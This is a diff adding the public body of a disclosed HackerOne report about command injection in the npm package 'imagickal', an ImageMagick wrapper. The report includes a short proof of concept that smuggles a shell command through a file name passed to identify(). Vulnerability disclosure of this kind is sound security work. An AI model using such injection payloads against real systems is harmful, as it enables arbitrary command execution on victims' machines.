@@ -9,6 +9,7 @@ tags:
 substate: "resolved"
 weakness: "Code Injection"
 enriched: true
+body: true
 date: 2021-01-14
 submitted: 2020-09-02T15:44:19.192Z
 bounty_usd: null
@@ -26,6 +27,63 @@ title: "[imagickal] Remote Code Execution"
 - Report: [https://hackerone.com/reports/973245](https://hackerone.com/reports/973245)
 - CWE: Code Injection
 - Submitted: 2020-09-02T15:44:19.192Z
+
+## Report body
+
+Public report body - fetched from `https://hackerone.com/reports/<id>.json` (the site's own disclosed-report data route).
+
+I would like to report `RCE` in `imagickal`
+It allows to execute arbitrary commands on the victim's PC
+
+# Module
+
+**module name:** imagickal
+**version:** 4.2.0
+**npm page:** `https://www.npmjs.com/package/imagickal`
+
+## Module Description
+
+node wrapper for ImageMagick commands
+
+## Module Stats
+
+[42] weekly downloads
+
+# Vulnerability
+
+## Vulnerability Description
+
+Code injection while processing a photo
+
+## Steps To Reproduce:
+
+- Run `npm i imagickal`
+- Create and run the following POC index.js:
+
+```javascript
+var im = require('imagickal');
+
+im.identify('image.jpg;touch HACKED;').then(function (data) {
+  console.log(data);
+});
+```
+
+- The exploit worked and created the file - `HACKED`
+
+{F973742}
+
+## Patch
+
+Check input before command
+
+# Wrap up
+
+- I contacted the maintainer to let them know: [N]
+- I opened an issue in the related repository: [N]
+
+## Impact
+
+Command Injection on `imagickal` module via insecure command
 
 ## Timeline
 
